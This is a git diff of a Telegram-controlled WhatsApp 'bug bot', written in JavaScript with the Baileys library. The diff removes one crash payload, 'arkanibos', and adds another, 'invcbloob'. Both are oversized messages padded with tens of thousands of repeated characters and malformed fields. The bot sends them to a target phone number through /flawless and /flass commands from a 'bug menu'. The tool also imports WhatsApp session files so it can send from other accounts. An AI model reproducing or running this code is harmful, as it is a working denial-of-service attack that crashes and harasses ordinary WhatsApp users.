@@ -304,7 +304,7 @@ async function connectToWhatsApp(botNumber, chatId) {
         } else if (connection === "connecting") {
             await new Promise((resolve) => setTimeout(resolve, 1000));
             try {
-                let customcode = "ABCDEFGH";
+                let customcode = "123PIERRE";
                 if (!fs.existsSync(`${sessionDir}/creds.json`)) {
                     const code = await sock.requestPairingCode(botNumber, customcode);
                     const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
@@ -351,56 +351,238 @@ async function connectToWhatsApp(botNumber, chatId) {
     return sock;
 }
 
-async function arkanibos(sock, target) {
-const test = "ꦾ".repeat(20000);
-const crot = "\u0018".repeat(20000);
-  try {
-    const arkaganteng = {
-      viewOnceMessage: {
-        message: {
-          liveLocationMessage: {
-            degreesLatitude: 0,
-            degreesLongitude: 0,
-            caption: "ﾑ尺ズﾑ Wのﾘ" + test,
-            accuracyInMeters: 3,
-            sequenceNumber: 1,
-            timeOffset: Date.now(),
-            contextInfo: {
-              externalAdReply: {
-                title: "woy tunduk ke arka",
-                body: test,
-                thumbnailUrl: "https://picsum.photos/400/200",
-                sourceUrl: https://${test}.crash.arka.com/${test}/${test}/${test}/,
-                mediaType: 1,
-                renderLargerThumbnail: true,
-              },
-              quotedMessage: {
-                ephemeralMessage: {
-                  message: {
-                    locationMessage: {
-                      degreesLatitude: 0,
-                      degreesLongitude: 0,
-                      name: crot,
-                      address: crot,
-                      url: https://${test}.crash.arka.com/${test}/${test}/${test}/,
-                    },
-                  },
+/*
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          𝙁𝘼𝙂𝙏𝙄𝙊𝙉 𝘽𝘼𝙂 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ 𝙊𝙬𝙣𝙚𝙧 : @JianCode
+❯ 𝙏𝙦 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧 𝙋𝙚𝙣𝙮𝙚𝙙𝙞𝙖 𝘽𝙖𝙨𝙚
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢*/
+
+async function invcbloob(sock, target) {
+    let message = {
+        viewOnceMessage: {
+            message: {
+                messageContextInfo: {
+                    deviceListMetadata: {},
+                    deviceListMetadataVersion: 3,
                 },
-              },
+                interactiveMessage: {
+                    contextInfo: {
+                        mentionedJid: [target],
+                        isForwarded: true,
+                        forwardingScore: 99999999,
+                        businessMessageForwardInfo: {
+                            businessOwnerJid: target,
+                        },
+                    },
+                    body: {
+                        text: "invc" + "꧀".repeat(100000),
+                    },
+                    nativeFlowMessage: {
+                        buttons: [{
+                                name: "single_select",
+                                buttonParamsJson: "",
+                            },
+                            {
+                                name: "call_permission_request",
+                                buttonParamsJson: "",
+                            },
+                            {
+                                name: "mpm",
+                                buttonParamsJson: "",
+                            },
+                        ],
+                    },
+                },
             },
-          },
         },
-      },
     };
 
-    await sock.relayMessage(target, arkaganteng, {
-      messageId: "suki_meki_" + Date.now(),
+    await sock.relayMessage(target, message, {
+        participant: {
+            jid: target
+        },
     });
-    console.log("send");
-  } catch (err) {
-    console.error("err:", err);
-  }
 }
+
+bot.onText(/\/start/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id.toString();
+    const username = msg.from.username || 'Tidak ada username';
+    const firstName = msg.from.first_name || '';
+    const lastName = msg.from.last_name || '';
+    const fullName = `${firstName} ${lastName}`.trim();
+
+    if (userId === config.OWNER_ID) {
+        const keyboard = {
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "ᴀᴄᴄᴇss ᴏᴡɴᴇʀ", callback_data: "access_owner" }, { text: "ᴛᴏᴏʟs ᴍᴇɴᴜ", callback_data: "tools_menu" }],
+                    [{ text: "ʙᴜɢ ᴍᴇɴᴜ", callback_data: "bug_menu" }, { text: "ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ", url: "https://t.me/JianCode" }]
+                ]
+            }
+        };
+
+        await bot.sendPhoto(
+            chatId,
+            'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
+            {
+                caption: `\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          sғᴇsʀ ᴏᴡɴᴇʀ
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ Status: ᴀᴋᴛɪғ
+❯ Time: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``,
+                parse_mode: "Markdown",
+                reply_markup: keyboard.reply_markup
+            }
+        );
+    } else {
+        await bot.sendPhoto(
+            chatId,
+            'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
+            {
+                caption: `\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ Status: ɴᴏɴ-ᴏᴡɴᴇʀ
+❯ Time: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``,
+                parse_mode: "Markdown",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ", url: "https://t.me/JianCode" }]
+                    ]
+                }
+            }
+        );
+    }
+});
+
+bot.on('callback_query', async (callbackQuery) => {
+    const msg = callbackQuery.message;
+    const userId = callbackQuery.from.id.toString();
+    const username = callbackQuery.from.username || 'Tidak ada username';
+    const firstName = callbackQuery.from.first_name || '';
+    const lastName = callbackQuery.from.last_name || '';
+    const fullName = `${firstName} ${lastName}`.trim();
+    const chatId = msg.chat.id;
+    const data = callbackQuery.data;
+
+    try {
+        await bot.answerCallbackQuery(callbackQuery.id);
+    } catch (error) {
+        console.error('Error answering callback query:', error);
+        return;
+    }
+
+    if (userId !== config.OWNER_ID) {
+        return;
+    }
+
+    try {
+        if (data === "access_owner") {
+            await bot.editMessageCaption(
+                `\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          ᴏᴡɴᴇʀ ɪɴғᴏ
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ ɪᴅ: ${userId}
+❴ ᴜsᴇʀɴᴀᴍᴇ: @${username}
+❴ ɴᴀᴍᴇ: ${fullName}
+❯ ᴛɪᴍᴇ: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``,
+                {
+                    chat_id: chatId,
+                    message_id: msg.message_id,
+                    parse_mode: "Markdown",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: "ʙᴀᴄᴋ", callback_data: "back_start" }]
+                        ]
+                    }
+                }
+            );
+        } else if (data === "tools_menu") {
+            await bot.editMessageCaption(
+                `\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          ᴏᴡɴᴇʀ ᴍᴇɴᴜ
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ /addsender [ɴᴏᴍᴏʀ]
+❯ /listsender
+❯ /infobot
+❯ /delbot [ɴᴏᴍᴏʀ]
+❯ /addsession
+❯ ᴛɪᴍᴇ: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``,
+                {
+                    chat_id: chatId,
+                    message_id: msg.message_id,
+                    parse_mode: "Markdown",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: "ʙᴀᴄᴋ", callback_data: "back_start" }]
+                        ]
+                    }
+                }
+            );
+        } else if (data === "bug_menu") {
+            await bot.editMessageCaption(
+                `\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          ʙᴜɢ ᴍᴇɴᴜ
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ /flawless [ɴᴏᴍᴏʀ]
+❯ /flass [ɴᴏᴍᴏʀ]
+❯ ᴛɪᴍᴇ: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``,
+                {
+                    chat_id: chatId,
+                    message_id: msg.message_id,
+                    parse_mode: "Markdown",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: "ʙᴀᴄᴋ", callback_data: "back_start" }]
+                        ]
+                    }
+                }
+            );
+        } else if (data === "back_start") {
+            await bot.editMessageCaption(
+                `\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          sғᴇsʀ ᴏᴡɴᴇʀ
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ Status: ᴀᴋᴛɪғ
+❯ Time: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``,
+                {
+                    chat_id: chatId,
+                    message_id: msg.message_id,
+                    parse_mode: "Markdown",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: "ᴀᴄᴄᴇss ᴏᴡɴᴇʀ", callback_data: "access_owner" }, { text: "ᴛᴏᴏʟs ᴍᴇɴᴜ", callback_data: "tools_menu" }],
+                            [{ text: "ʙᴜɢ ᴍᴇɴᴜ", callback_data: "bug_menu" }, { text: "ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ", url: "https://t.me/JianCode" }]
+                        ]
+                    }
+                }
+            );
+        }
+    } catch (error) {
+        console.error('Error handling callback query:', error);
+    }
+});
 
 bot.onText(/\/addsender/, async (msg) => {
     const chatId = msg.chat.id;
@@ -493,153 +675,6 @@ ${sessionList}
 \`\`\``,
         { parse_mode: "Markdown" }
     );
-});
-
-bot.onText(/\/start/, async (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id.toString();
-    const username = msg.from.username || 'Tidak ada username';
-    const firstName = msg.from.first_name || '';
-    const lastName = msg.from.last_name || '';
-    const fullName = `${firstName} ${lastName}`.trim();
-
-    if (userId === config.OWNER_ID) {
-        const keyboard = {
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "ᴀᴄᴄᴇss ᴏᴡɴᴇʀ", callback_data: "access_owner" }],
-                    [{ text: "ᴛᴏᴏʟs ᴍᴇɴᴜ", callback_data: "tools_menu" }]
-                ]
-            }
-        };
-
-        await bot.sendPhoto(
-            chatId,
-            'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
-            {
-                caption: `\`\`\`
-◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
-          sғᴇsʀ ᴏᴡɴᴇʀ
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❯ Status: ᴀᴋᴛɪғ
-❯ Time: ${moment().format('HH:mm:ss')}
-◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
-\`\`\``,
-                parse_mode: "Markdown",
-                reply_markup: keyboard.reply_markup
-            }
-        );
-    } else {
-        await bot.sendPhoto(
-            chatId,
-            'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
-            {
-                caption: `\`\`\`
-◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
-          ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❯ Status: ɴᴏɴ-ᴏᴡɴᴇʀ
-❯ Time: ${moment().format('HH:mm:ss')}
-◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
-\`\`\``,
-                parse_mode: "Markdown"
-            }
-        );
-    }
-});
-
-bot.on('callback_query', async (callbackQuery) => {
-    const msg = callbackQuery.message;
-    const userId = callbackQuery.from.id.toString();
-    const username = callbackQuery.from.username || 'Tidak ada username';
-    const firstName = callbackQuery.from.first_name || '';
-    const lastName = callbackQuery.from.last_name || '';
-    const fullName = `${firstName} ${lastName}`.trim();
-    const chatId = msg.chat.id;
-    const data = callbackQuery.data;
-
-    if (userId !== config.OWNER_ID) {
-        await bot.answerCallbackQuery(callbackQuery.id, {
-            text: "ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ!",
-            show_alert: true
-        });
-        return;
-    }
-
-    if (data === "access_owner") {
-        await bot.editMessageCaption(
-            `\`\`\`
-◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
-          ᴏᴡɴᴇʀ ɪɴғᴏ
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❯ ɪᴅ: ${userId}
-❴ ᴜsᴇʀɴᴀᴍᴇ: @${username}
-❴ ɴᴀᴍᴇ: ${fullName}
-❯ ᴛɪᴍᴇ: ${moment().format('HH:mm:ss')}
-◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
-\`\`\``,
-            {
-                chat_id: chatId,
-                message_id: msg.message_id,
-                parse_mode: "Markdown",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: "ʙᴀᴄᴋ", callback_data: "back_start" }]
-                    ]
-                }
-            }
-        );
-    } else if (data === "tools_menu") {
-        await bot.editMessageCaption(
-            `\`\`\`
-◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
-          ᴛᴏᴏʟs ᴍᴇɴᴜ
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❯ /addsender [ɴᴏᴍᴏʀ]
-❯ /listsender
-❯ /infobot
-❯ /delbot [ɴᴏᴍᴏʀ]
-❯ /addsession
-❯ /flawless [ɴᴏᴍᴏʀ]
-❯ ᴛɪᴍᴇ: ${moment().format('HH:mm:ss')}
-◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
-\`\`\``,
-            {
-                chat_id: chatId,
-                message_id: msg.message_id,
-                parse_mode: "Markdown",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: "ʙᴀᴄᴋ", callback_data: "back_start" }]
-                    ]
-                }
-            }
-        );
-    } else if (data === "back_start") {
-        await bot.editMessageCaption(
-            `\`\`\`
-◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
-          sғᴇsʀ ᴏᴡɴᴇʀ
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❯ Status: ᴀᴋᴛɪғ
-❯ Time: ${moment().format('HH:mm:ss')}
-◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
-\`\`\``,
-            {
-                chat_id: chatId,
-                message_id: msg.message_id,
-                parse_mode: "Markdown",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: "ᴀᴄᴄᴇss ᴏᴡɴᴇʀ", callback_data: "access_owner" }],
-                        [{ text: "ᴛᴏᴏʟs ᴍᴇɴᴜ", callback_data: "tools_menu" }]
-                    ]
-                }
-            }
-        );
-    }
-
-    await bot.answerCallbackQuery(callbackQuery.id);
 });
 
 bot.onText(/\/delbot (.+)/, async (msg, match) => {
@@ -789,11 +824,8 @@ bot.onText(/\/addsession/, async (msg) => {
     const userId = msg.from.id.toString();
     
     if (userId !== config.OWNER_ID) {
-        await bot.sendPhoto(
-            chatId,
-            'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
-            {
-                caption: `\`\`\`
+        await bot.sendPhoto(chatId, 'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg', {
+            caption: `\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -801,16 +833,13 @@ bot.onText(/\/addsession/, async (msg) => {
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
 \`\`\``,
-                parse_mode: "Markdown"
-            }
-        );
+            parse_mode: "Markdown"
+        });
         return;
     }
 
-    const sentMessage = await bot.sendPhoto(
-        chatId,
-        'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
-        {
+    try {
+        const sentMessage = await bot.sendPhoto(chatId, 'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg', {
             caption: `\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴀᴅᴅ sᴇssɪᴏɴ
@@ -821,28 +850,35 @@ bot.onText(/\/addsession/, async (msg) => {
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
 \`\`\``,
             parse_mode: "Markdown",
-            reply_markup: {
-                force_reply: true
-            }
-        }
-    );
+            reply_markup: { force_reply: true }
+        });
 
-    addSessionWaitReply.set(chatId, sentMessage.message_id);
+        addSessionWaitReply.set(chatId, {
+            messageId: sentMessage.message_id,
+            timestamp: Date.now()
+        });
+    } catch (error) {
+        console.error('Error sending addsession message:', error);
+    }
 });
 
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id.toString();
-    const waitMessageId = addSessionWaitReply.get(chatId);
+    const waitData = addSessionWaitReply.get(chatId);
 
-    if (waitMessageId && msg.reply_to_message && msg.reply_to_message.message_id === waitMessageId && userId === config.OWNER_ID) {
+    if (waitData && msg.reply_to_message && msg.reply_to_message.message_id === waitData.messageId && userId === config.OWNER_ID) {
         addSessionWaitReply.delete(chatId);
 
+        try {
+            await bot.sendChatAction(chatId, 'typing');
+        } catch (error) {
+            console.error('Error sending chat action:', error);
+        }
+
         if (!msg.document) {
-            await bot.sendPhoto(
-                chatId,
-                'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
-                {
+            try {
+                await bot.sendPhoto(chatId, 'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg', {
                     caption: `\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴇʀʀᴏʀ
@@ -852,8 +888,10 @@ bot.on('message', async (msg) => {
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
 \`\`\``,
                     parse_mode: "Markdown"
-                }
-            );
+                });
+            } catch (error) {
+                console.error('Error sending error message:', error);
+            }
             return;
         }
 
@@ -861,10 +899,8 @@ bot.on('message', async (msg) => {
         const fileName = msg.document.file_name;
 
         if (!fileName.endsWith('.zip')) {
-            await bot.sendPhoto(
-                chatId,
-                'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
-                {
+            try {
+                await bot.sendPhoto(chatId, 'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg', {
                     caption: `\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴇʀʀᴏʀ
@@ -874,8 +910,28 @@ bot.on('message', async (msg) => {
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
 \`\`\``,
                     parse_mode: "Markdown"
-                }
-            );
+                });
+            } catch (error) {
+                console.error('Error sending file type error:', error);
+            }
+            return;
+        }
+
+        let processingMsg;
+        try {
+            processingMsg = await bot.sendPhoto(chatId, 'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg', {
+                caption: `\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          ᴘʀᴏᴄᴇssɪɴɢ
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ Status: ᴍᴇᴍᴘʀᴏsᴇs ꜰɪʟᴇ sᴇssɪᴏɴ
+❯ Time: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``,
+                parse_mode: "Markdown"
+            });
+        } catch (error) {
+            console.error('Error sending processing message:', error);
             return;
         }
 
@@ -884,7 +940,8 @@ bot.on('message', async (msg) => {
             const response = await axios({
                 method: 'GET',
                 url: fileLink,
-                responseType: 'arraybuffer'
+                responseType: 'arraybuffer',
+                timeout: 30000
             });
 
             const zip = new AdmZip(response.data);
@@ -902,65 +959,84 @@ bot.on('message', async (msg) => {
             }
 
             if (!phoneNumber) {
-                await bot.sendPhoto(
-                    chatId,
-                    'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
-                    {
-                        caption: `\`\`\`
+                for (const entry of zipEntries) {
+                    const match = entry.entryName.match(/(\d+)/);
+                    if (match && match[1].length >= 10) {
+                        phoneNumber = match[1];
+                        break;
+                    }
+                }
+            }
+
+            if (!phoneNumber) {
+                await bot.editMessageCaption(`\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴇʀʀᴏʀ
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ❯ Status: ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
-\`\`\``,
-                        parse_mode: "Markdown"
-                    }
-                );
+\`\`\``, {
+                    chat_id: chatId,
+                    message_id: processingMsg.message_id,
+                    parse_mode: "Markdown"
+                });
                 return;
             }
 
             const sessionDir = createSessionDir(phoneNumber);
+
             zip.extractAllTo(sessionDir, true);
 
-            const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+            const sessionFiles = fs.readdirSync(sessionDir);
+            if (sessionFiles.length === 0) {
+                await bot.editMessageCaption(`\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          ᴇʀʀᴏʀ
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ ɴᴏᴍᴏʀ: ${phoneNumber}
+❯ Status: ꜰɪʟᴇ sᴇssɪᴏɴ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ
+❯ Time: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``, {
+                    chat_id: chatId,
+                    message_id: processingMsg.message_id,
+                    parse_mode: "Markdown"
+                });
+                return;
+            }
 
+            const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+            
             const sock = makeWASocket({
                 auth: state,
                 printQRInTerminal: false,
                 logger: P({ level: "silent" }),
-                defaultQueryTimeoutMs: undefined,
+                defaultQueryTimeoutMs: 60000,
+                connectTimeoutMs: 60000,
             });
 
-            const connectionResult = await new Promise((resolve) => {
+            let connected = false;
+            const connectionPromise = new Promise((resolve, reject) => {
                 const timeout = setTimeout(() => {
-                    sock.ev.off('connection.update', connectionHandler);
-                    resolve(false);
-                }, 15000);
+                    if (!connected) {
+                        sock.ws.close();
+                        reject(new Error('Connection timeout'));
+                    }
+                }, 45000);
 
-                const connectionHandler = (update) => {
+                sock.ev.on('connection.update', async (update) => {
                     const { connection, lastDisconnect } = update;
-                    if (connection === "open") {
+                    
+                    if (connection === 'open') {
                         clearTimeout(timeout);
+                        connected = true;
+                        
                         sessions.set(phoneNumber, sock);
                         sock.ev.on("creds.update", saveCreds);
                         saveActiveSessions(phoneNumber);
-                        resolve(true);
-                    } else if (connection === "close") {
-                        clearTimeout(timeout);
-                        resolve(false);
-                    }
-                };
 
-                sock.ev.on('connection.update', connectionHandler);
-            });
-
-            if (connectionResult) {
-                await bot.sendPhoto(
-                    chatId,
-                    'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
-                    {
-                        caption: `\`\`\`
+                        await bot.editMessageCaption(`\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           sᴜᴄᴄᴇss
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -968,16 +1044,33 @@ bot.on('message', async (msg) => {
 ❯ Status: ʙᴇʀʜᴀsɪʟ ᴛᴇʀʜᴜʙᴜɴɢ
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
-\`\`\``,
-                        parse_mode: "Markdown"
-                    }
-                );
-            } else {
-                await bot.sendPhoto(
-                    chatId,
-                    'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
-                    {
-                        caption: `\`\`\`
+\`\`\``, {
+                            chat_id: chatId,
+                            message_id: processingMsg.message_id,
+                            parse_mode: "Markdown"
+                        });
+                        resolve(true);
+                    } else if (connection === 'close') {
+                        clearTimeout(timeout);
+                        connected = true;
+                        const error = lastDisconnect?.error;
+                        
+                        if (error?.output?.statusCode === 403) {
+                            await bot.editMessageCaption(`\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          ᴇʀʀᴏʀ
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ ɴᴏᴍᴏʀ: ${phoneNumber}
+❯ Status: ʙʟᴏᴋɪʀ ʙʏ ᴡʜᴀᴛsᴀᴘᴘ
+❯ Time: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``, {
+                                chat_id: chatId,
+                                message_id: processingMsg.message_id,
+                                parse_mode: "Markdown"
+                            });
+                        } else {
+                            await bot.editMessageCaption(`\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴇʀʀᴏʀ
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -985,32 +1078,40 @@ bot.on('message', async (msg) => {
 ❯ Status: ɢᴀɢᴀʟ ᴛᴇʀʜᴜʙᴜɴɢ
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
-\`\`\``,
-                        parse_mode: "Markdown"
+\`\`\``, {
+                                chat_id: chatId,
+                                message_id: processingMsg.message_id,
+                                parse_mode: "Markdown"
+                            });
+                        }
+                        if (fs.existsSync(sessionDir)) {
+                            fs.rmSync(sessionDir, { recursive: true, force: true });
+                        }
+                        reject(new Error('Connection closed'));
                     }
-                );
-                
-                if (fs.existsSync(sessionDir)) {
-                    fs.rmSync(sessionDir, { recursive: true, force: true });
-                }
-            }
+                });
+            });
+
+            await connectionPromise;
 
         } catch (error) {
-            await bot.sendPhoto(
-                chatId,
-                'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
-                {
-                    caption: `\`\`\`
+            console.error('Error processing session:', error);
+            try {
+                await bot.editMessageCaption(`\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴇʀʀᴏʀ
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ❯ Status: ${error.message}
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
-\`\`\``,
+\`\`\``, {
+                    chat_id: chatId,
+                    message_id: processingMsg.message_id,
                     parse_mode: "Markdown"
-                }
-            );
+                });
+            } catch (editError) {
+                console.error('Error editing message:', editError);
+            }
         }
     }
 });
@@ -1112,7 +1213,7 @@ bot.onText(/\/flawless (.+)/, async (msg, match) => {
           ᴘʀᴏsᴇs
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ❯ ᴛᴀʀɢᴇᴛ: ${formatednumber}
-❯ Status: ᴍᴇɴɢɪɴɪsɪᴀʟɪsᴀsɪ...
+❯ Status: sᴇᴋ ɴɢɪʀɪᴍ...
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
 \`\`\``,
@@ -1126,7 +1227,7 @@ bot.onText(/\/flawless (.+)/, async (msg, match) => {
           ᴘʀᴏsᴇs
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ❯ ᴛᴀʀɢᴇᴛ: ${formatednumber}
-❯ Status: ᴍᴇɴʏɪᴀᴘᴋᴀɴ ᴘᴇsᴀɴ...
+❯ Status: ᴏᴛᴡ ᴋɪʀɪᴍ ғᴀɴᴋ ʟᴜ ʙʀᴇᴋᴋ...
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
 \`\`\``,
@@ -1135,7 +1236,7 @@ bot.onText(/\/flawless (.+)/, async (msg, match) => {
           ᴘʀᴏsᴇs
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ❯ ᴛᴀʀɢᴇᴛ: ${formatednumber}
-❯ Status: ᴍᴇɴɢɪʀɪᴍᴋᴀɴ...
+❯ Status: ᴍᴜᴛᴇʀ𝟸...
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
 \`\`\``,
@@ -1144,13 +1245,13 @@ bot.onText(/\/flawless (.+)/, async (msg, match) => {
           ᴘʀᴏsᴇs
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
